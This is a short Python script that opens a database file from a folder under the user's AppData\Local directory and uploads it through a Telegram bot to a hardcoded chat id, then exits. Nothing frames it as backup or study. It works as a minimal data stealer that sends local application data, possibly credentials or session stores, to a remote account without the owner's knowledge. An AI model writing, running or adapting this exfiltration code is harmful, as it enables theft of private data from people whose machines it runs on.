import telebot
import datetime
import os
import sys
from time import sleep
bot_token = telebot.TeleBot('00:a1-b2', parse_mode=None)
user_id = 00000000
now = datetime.datetime.now()
data = now.strftime('%d-%m-%Yг. %H:%M:%S')
home_dir = os.environ['userprofile']
dir_name = os.environ['dir_name_env']
path = home_dir + "\\Appdata\\Local\\" + dir_name + "\\ec35312fb3a7e05.db"
bot_token.send_document(user_id, open(path, 'rb'), caption=data) 
sys.exit()